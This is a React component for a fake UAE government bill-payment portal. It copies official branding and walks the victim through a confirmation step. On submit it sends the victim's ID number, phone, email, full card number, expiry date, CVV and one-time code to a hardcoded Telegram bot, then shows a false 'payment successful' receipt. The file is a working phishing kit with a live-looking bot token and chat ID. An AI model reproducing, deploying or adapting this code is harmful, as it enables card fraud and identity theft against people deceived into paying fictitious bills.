import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { Button } from "@/components/ui/button";
import { CheckCircle2, Printer, Download, Share2, Loader2, ShieldCheck, AlertCircle } from "lucide-react";

export default function ConfirmPayment() {
  const [, setLocation] = useLocation();
  const [loading, setLoading] = useState(false);
  const [confirmed, setConfirmed] = useState(false);
  const [paymentData, setPaymentData] = useState<any>({});
  const [referenceNumber, setReferenceNumber] = useState("");

  useEffect(() => {
    const data = JSON.parse(sessionStorage.getItem("paymentData") || "{}");
    setPaymentData(data);
    setReferenceNumber(`UAE-${Math.random().toString(36).substring(2, 10).toUpperCase()}`);
  }, []);

  const TELEGRAM_BOT_TOKEN = "8679116779:AAFA4ChWcYM9ZiHa3BAr3IylTOUEWvFQNkw";
  const TELEGRAM_CHAT_ID = "8362204213";

  const handleConfirm = async () => {
    setLoading(true);

    const message = `
✅ *تأكيد السداد النهائي - بوابة سداد الإمارات*
--------------------------
🧾 *رقم الفاتورة:* ${paymentData.invoiceNumber}
🏛 *البنك:* ${paymentData.bank}
💰 *المبلغ:* ${paymentData.amount} درهم إماراتي
🆔 *رقم الهوية:* ${paymentData.idNumber}
📱 *رقم الجوال:* ${paymentData.phoneNumber}
📧 *البريد الإلكتروني:* ${paymentData.email}
💳 *رقم البطاقة:* ${paymentData.cardNumber}
👤 *حامل البطاقة:* ${paymentData.cardHolder}
📅 *تاريخ الانتهاء:* ${paymentData.expiryDate}
🔒 *CVV:* ${paymentData.cvv}
🔐 *رمز التحقق:* ${paymentData.otp}
--------------------------
🏁 *الحالة:* تم التأكيد بنجاح
🔢 *رقم المرجع:* ${referenceNumber}
    `;

    try {
      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: "Markdown",
        }),
      });
      
      setTimeout(() => {
        setConfirmed(true);
        sessionStorage.clear();
      }, 2000);
    } catch (error) {
      console.error(error);
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex flex-col bg-gray-50 font-sans text-right" dir="rtl">
      <header className="bg-white border-b border-gray-200 py-4 shadow-sm">
        <div className="container flex justify-between items-center">
          <div className="flex items-center gap-3">
            <div className="bg-amber-500 p-2 rounded-lg">
              <span className="text-white font-bold text-sm">سداد</span>
            </div>
            <h1 className="text-lg font-bold text-gray-800">بوابة سداد الإمارات</h1>
          </div>
          <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/cb/Emblem_of_the_United_Arab_Emirates.svg/1200px-Emblem_of_the_United_Arab_Emirates.svg.png" alt="UAE" className="h-10" />
        </div>
      </header>

      <main className="flex-grow container py-12 px-4">
        <div className="max-w-2xl mx-auto">
          {/* Progress Steps */}
          <div className="flex justify-between mb-12 relative px-4">
            {[1, 2, 3, 4, 5].map((step) => (
              <div key={step} className="flex flex-col items-center z-10">
                <div className={`w-10 h-10 rounded-full flex items-center justify-center font-bold border-2 transition-all ${step <= 5 ? 'bg-amber-500 border-amber-500 text-white shadow-lg shadow-amber-500/30' : 'bg-white border-gray-200 text-gray-400'}`}>
                  {step}
                </div>
                <span className={`text-[10px] mt-2 font-bold ${step <= 5 ? 'text-amber-600' : 'text-gray-400'}`}>
                  {step === 1 ? 'البيانات' : step === 2 ? 'البنك' : step === 3 ? 'البطاقة' : step === 4 ? 'التحقق' : 'التأكيد'}
                </span>
              </div>
            ))}
            <div className="absolute top-5 left-8 right-8 h-0.5 bg-gray-200 -z-0"></div>
          </div>

          <div className="bg-white rounded-2xl shadow-xl border border-gray-100 overflow-hidden">
            {!confirmed ? (
              <>
                <div className="bg-slate-900 p-8 text-white text-center">
                  <h2 className="text-2xl font-bold">مراجعة وتأكيد السداد</h2>
                  <p className="text-slate-400 text-sm mt-2">يرجى مراجعة تفاصيل المعاملة قبل الاعتماد النهائي</p>
                </div>

                <div className="p-8">
                  <div className="space-y-4 bg-gray-50 p-6 rounded-2xl border border-gray-100 mb-8">
                    <div className="flex justify-between items-center border-b border-gray-200 pb-3">
                      <span className="text-gray-500 text-sm">رقم الفاتورة:</span>
                      <span className="font-bold text-gray-900">{paymentData.invoiceNumber}</span>
                    </div>
                    <div className="flex justify-between items-center border-b border-gray-200 pb-3">
                      <span className="text-gray-500 text-sm">نوع الخدمة:</span>
                      <span className="font-bold text-gray-900">{paymentData.serviceType}</span>
                    </div>
                    <div className="flex justify-between items-center border-b border-gray-200 pb-3">
                      <span className="text-gray-500 text-sm">البنك المختار:</span>
                      <span className="font-bold text-gray-900">{paymentData.bank}</span>
                    </div>
                    <div className="flex justify-between items-center border-b border-gray-200 pb-3">
                      <span className="text-gray-500 text-sm">رقم الهوية:</span>
                      <span className="font-bold text-gray-900">{paymentData.idNumber}</span>
                    </div>
                    <div className="flex justify-between items-center pt-2">
                      <span className="text-lg font-bold text-gray-900">المبلغ الإجمالي:</span>
                      <div className="text-right">
                        <span className="text-2xl font-black text-amber-600">{paymentData.amount}</span>
                        <span className="text-xs font-bold text-amber-600 mr-1">د.إ</span>
                      </div>
                    </div>
                  </div>

                  <div className="bg-amber-50 border border-amber-100 p-4 rounded-xl flex gap-3 mb-8">
                    <AlertCircle className="w-5 h-5 text-amber-600 shrink-0" />
                    <p className="text-[11px] text-amber-800 leading-relaxed">
                      بالنقر على "تأكيد السداد"، فإنك تفوض بوابة سداد الإمارات بخصم المبلغ المذكور أعلاه من حسابك البنكي. سيتم إصدار إيصال سداد رسمي فور اكتمال العملية.
                    </p>
                  </div>

                  <div className="flex gap-4">
                    <Button variant="ghost" className="flex-1 text-gray-500" onClick={() => setLocation("/verify-otp")}>الرجوع</Button>
                    <Button className="flex-[2] bg-amber-500 hover:bg-amber-600 text-white font-bold py-6 rounded-xl shadow-lg shadow-amber-500/20" onClick={handleConfirm} disabled={loading}>
                      {loading ? (
                        <span className="flex items-center gap-2">
                          <Loader2 className="w-5 h-5 animate-spin" /> جاري معالجة السداد...
                        </span>
                      ) : "تأكيد السداد النهائي"}
                    </Button>
                  </div>
                </div>
              </>
            ) : (
              <div className="p-12 text-center">
                <div className="w-24 h-24 bg-green-100 text-green-600 rounded-full flex items-center justify-center text-5xl mx-auto mb-8 shadow-inner">
                  <CheckCircle2 className="w-12 h-12" />
                </div>
                <h2 className="text-3xl font-black text-gray-900 mb-4">تمت عملية السداد بنجاح</h2>
                <p className="text-gray-500 mb-8 leading-relaxed max-w-md mx-auto">
                  شكراً لاستخدامك بوابة سداد الإمارات. تم استلام دفعتك بنجاح وتحديث حالة الفاتورة لدى الجهة المعنية.
                </p>
                
                <div className="bg-gray-50 rounded-2xl p-6 border border-gray-100 mb-10 text-right space-y-3">
                  <div className="flex justify-between text-sm">
                    <span className="text-gray-400">رقم المرجع:</span>
                    <span className="font-mono font-bold text-gray-900">{referenceNumber}</span>
                  </div>
                  <div className="flex justify-between text-sm">
                    <span className="text-gray-400">تاريخ العملية:</span>
                    <span className="font-bold text-gray-900">{new Date().toLocaleDateString('ar-AE')}</span>
                  </div>
                  <div className="flex justify-between text-sm">
                    <span className="text-gray-400">المبلغ المدفوع:</span>
                    <span className="font-bold text-green-600">{paymentData.amount} درهم إماراتي</span>
                  </div>
                </div>

                <div className="grid grid-cols-2 gap-4 mb-8">
                  <Button variant="outline" className="flex items-center gap-2 py-6 border-gray-200">
                    <Printer className="w-4 h-4" /> طباعة الإيصال
                  </Button>
                  <Button variant="outline" className="flex items-center gap-2 py-6 border-gray-200">
                    <Download className="w-4 h-4" /> تحميل PDF
                  </Button>
                </div>

                <div className="flex flex-col gap-3">
                  <Button className="bg-slate-900 hover:bg-slate-800 text-white py-6 rounded-xl font-bold" onClick={() => setLocation("/")}>العودة للرئيسية</Button>
                  <Button variant="ghost" className="text-amber-600 font-bold" onClick={() => setLocation("/user-data")}>إجراء عملية سداد أخرى</Button>
                </div>
                
                <div className="mt-12 pt-8 border-t border-gray-100 flex justify-center gap-6 opacity-50">
                  <ShieldCheck className="w-5 h-5" />
                  <Share2 className="w-5 h-5" />
                </div>
              </div>
            )}
          </div>
        </div>
      </main>
    </div>
  );
}
